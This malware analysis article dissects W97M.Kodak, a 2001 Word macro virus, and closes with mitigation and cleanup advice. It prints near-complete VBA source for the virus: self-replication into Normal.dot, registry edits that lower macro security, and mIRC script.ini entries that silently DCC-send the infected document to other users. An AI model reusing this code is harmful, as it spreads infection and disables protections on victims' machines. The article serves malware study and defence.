# Dissecting W97M.Kodak: A Word Macro Virus with mIRC Propagation 🛠️🔍

## Disclaimer
This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes.

## Introduction
W97M.Kodak (June 2001) is a Word macro virus written in Visual Basic for Applications (VBA). It activates on document open/close, weakens Office macro security, copies its code to the global template for persistence, and leverages mIRC to propagate a dropped document via DCC. The virus uses standard Word automation (VBProject import, Normal.dot infection) rather than exploits, relying on users opening infected documents and permissive macro settings. It also employs Office Assistant “balloon” messages as cosmetic decoys and author tags.

Analyzing this sample illustrates the classic macro-virus lifecycle: entry via a document, elevation of macro execution capability, replication into templates and other documents, and optional side channels for spread. Because it uses deterministic registry keys, file names, and mIRC script content, defenders can hunt and remediate effectively—even on legacy systems where macro security was lower by default.

## Overview of the Malware 🐛
W97M.Kodak’s behavior centers on persistence in Word and social propagation.

- Trigger points: Macros `AutoOpen` and `AutoClose` execute on document open/close. Additional helper macros (`HelpAbout`, `ViewVBCode`, `ToolsOptions`, `ToolsSecurity`) adjust UI and settings.
- Local drop + IRC spread: On open, it saves the current document as `C:\Windows\Kodak.doc`, creates a temporary mIRC script file, and copies it to several mIRC `script.ini` locations so that channel JOIN events trigger a silent DCC send of `Kodak.doc`.
- Persistence in Word: On close, it lowers Word’s macro security (Office 9.0 and 10.0), writes its VBA code to a staging file `C:\Kodak.vxd`, imports that code into `Normal.dot` (global template) if a registry marker is absent, and then imports into the active document as well.
- Reinfection guard: Adds `HKLM\Software\Microsoft\W97M.Kodak = ClicClac` to avoid repeating the Normal.dot import.
- Cosmetic/UI: On the 5th day of the month, shows a Clippy balloon; `HelpAbout` shows another balloon; `ViewVBCode` displays a message and opens the VB editor. `ToolsOptions` and `ToolsSecurity` briefly enable protection prompts, then revert them.

The virus targets environments with mIRC and Office 2000/XP. It does not contain destructive payloads beyond security weakening and template infection.

## Source Code Analysis 🔬
The code is organized around auto-executing macros and helper routines.

### AutoOpen: Save lure and seed mIRC
```vb
Sub AutoOpen()
  On Error Resume Next
  ActiveDocument.SaveAs FileName:="C:\Windows\Kodak.doc"
  ActiveDocument.Saved = True
  Open "C:\script.drv" For Output As #1
  Print #1, "n0=on 1:JOIN:#:{"
  Print #1, "n1= /if ( $nick == $me ) { halt }"
  Print #1, "n2= /.dcc send $nick C:\Windows\Kodak.doc"
  Print #1, "n3=}"
  Close #1
  FileSystem.FileCopy "C:\script.drv", "C:\mirc\script.ini"
  FileSystem.FileCopy "C:\script.drv", "C:\mirc32\script.ini"
  FileSystem.FileCopy "C:\script.drv", "C:\progra~1\mirc\script.ini"
  FileSystem.FileCopy "C:\script.drv", "C:\progra~1\mirc32\script.ini"
  FileSystem.Kill "C:\script.drv"
  If Day(Now) = 5 Then Call ShowBalloon("I am always here. And you, are you here.")
End Sub
```
- Saves the current document under a Windows-sounding name `Kodak.doc` in the Windows directory.
- Builds a minimal mIRC script that triggers on channel JOIN and silently DCC sends the document; distributes it across common mIRC paths and cleans the staging file.
- Shows an Office Assistant balloon on day 5, serving as a visible “payload.” The helper `ShowBalloon` is inlined in the original using the Assistant object.

### AutoClose: Lower macro security and infect templates
```vb
Sub AutoClose()
  ' Lower macro security in Word 2000/XP
  If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> 1& Then
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
  End If
  If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") <> 1& Then
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
  End If

  ' Stage own code to C:\Kodak.vxd if not present
  If Dir("C:\Kodak.vxd", vbReadOnly) = "" Then
    Open "C:\Kodak.vxd" For Output As #1
    For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
      K = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
      Print #1, K
    Next i
    Close #1
    SetAttr "C:\Kodak.vxd", vbReadOnly
  End If

  ' One-time infection of Normal.dot (guarded by HKLM marker)
  If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\", "W97M.Kodak") <> "ClicClac" Then
    NormalTemplate.VBProject.VBComponents.Import "C:\Kodak.vxd"
    NormalTemplate.Save
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\", "W97M.Kodak") = "ClicClac"
  End If

  ' Infect the active document as well
  ActiveDocument.VBProject.VBComponents.Import "C:\Kodak.vxd"
  ActiveDocument.Save
End Sub
```
- Uses `System.PrivateProfileString` as a registry read/write shim to reduce Word’s macro security Level to 1 (lowest), enabling future macro execution without prompts.
- Exfiltrates its own VBA lines into `C:\Kodak.vxd` and marks the file read-only. This staging file is then imported into the Normal template’s VBProject (persistence across Word sessions) when a registry marker is absent.
- Writes the marker `HKLM\Software\Microsoft\W97M.Kodak = ClicClac` to prevent repeated Normal.dot imports; the comment text mentions “CliClac,” but the code uses “ClicClac.”
- Also imports into the currently open document to propagate infection.

### UI helpers and macro security dialogs
```vb
Sub HelpAbout()
  With Application.Assistant: .Visible = True: End With
  With Assistant.NewBalloon
    .Text = "Smile and cheese for the photo": .Heading = "W97M.Kodak"
    .Animation = msoAnimationGetAttentionMajor: .Button = msoButtonSetOK
    .Show
  End With
End Sub

Sub ViewVBCode()
  MsgBox "was coded by PetiK(c)2001", vbInformation, "W97M.Kodak"
  ShowVisualBasicEditor = True
End Sub

Sub ToolsOptions()
  On Error Resume Next
  Options.VirusProtection = 1
  Options.SaveNormalPrompt = 1
  Dialogs(wdDialogToolsOptions).Show
  Options.VirusProtection = 0
  Options.SaveNormalPrompt = 0
End Sub

Sub ToolsSecurity()
  On Error Resume Next
  CommandBars("Macro").Controls("Security...").Enabled = True
  Dialogs(wdDialogToolsSecurity).Show
  CommandBars("Macro").Controls("Security...").Enabled = False
End Sub
```
- `ToolsOptions` temporarily enables built‑in protections/prompting before showing the Options dialog, then disables them again—likely to avoid user suspicion while maintaining low security thereafter.
- `ToolsSecurity` forces visibility of the Macro Security dialog; together these UI macros are unusual for benign templates and provide detection hooks.

## Mitigation and Defense Strategies 🛡️
- Macro security posture: Set Office macro policy to “Block macros from the internet,” require signed macros, and disable “Trust access to the VBA project object model” via Group Policy. Enforce High/Very High macro settings for Word 2000/XP in legacy environments.
- Template integrity: Monitor and protect `Normal.dot`/`Normal.dotm`. Alert on VBProject modifications and imports, and on unexpected creation or modification of `C:\Kodak.vxd` or registry markers under `HKLM\Software\Microsoft\W97M.Kodak`.
- mIRC controls: If IRC is permitted, monitor for writes to `script.ini` in typical paths (`C:\mirc*`, `C:\progra~1\mirc*`). Flag JOIN‑triggered `/dcc send` lines referencing `C:\Windows\Kodak.doc`.
- Email and document hygiene: Strip macros at the gateway for `.doc` files from untrusted sources; convert to safe formats (PDF) for review. Use Protected View and mark external documents as untrusted.
- EDR telemetry: Detect sequences of Word spawning file writes to Windows directories, creation of `.vxd` staging files, registry writes via `System.PrivateProfileString`, and VBProject import APIs. Correlate with mIRC `script.ini` creation if present.
- Least privilege and hardening: Run users without local admin to constrain writes to HKLM and system directories. Lock down Word trust center settings and disable legacy features (Office Assistant, legacy VB project access) when possible.
- Incident response: Remove malicious modules from `Normal.dot`, delete `C:\Kodak.vxd`, restore macro security levels, clear the `W97M.Kodak` registry marker, and remove mIRC `script.ini` payloads. Consider redeploying clean templates.

## Conclusion
W97M.Kodak exemplifies early‑2000s macro malware: it lowers security, embeds itself into `Normal.dot` for persistence, and piggybacks on mIRC to spread a saved copy of the infected document. While it lacks sophisticated stealth or exploits, its deterministic artifacts—`C:\Windows\Kodak.doc`, `C:\Kodak.vxd`, Normal.dot VBProject imports, registry markers, and mIRC `script.ini` content—offer clear detection and response paths. In modern deployments, strong macro governance, template protection, and application controls effectively neutralize this threat model; in legacy or archival systems, layered monitoring and IOC‑driven cleanup remain essential.
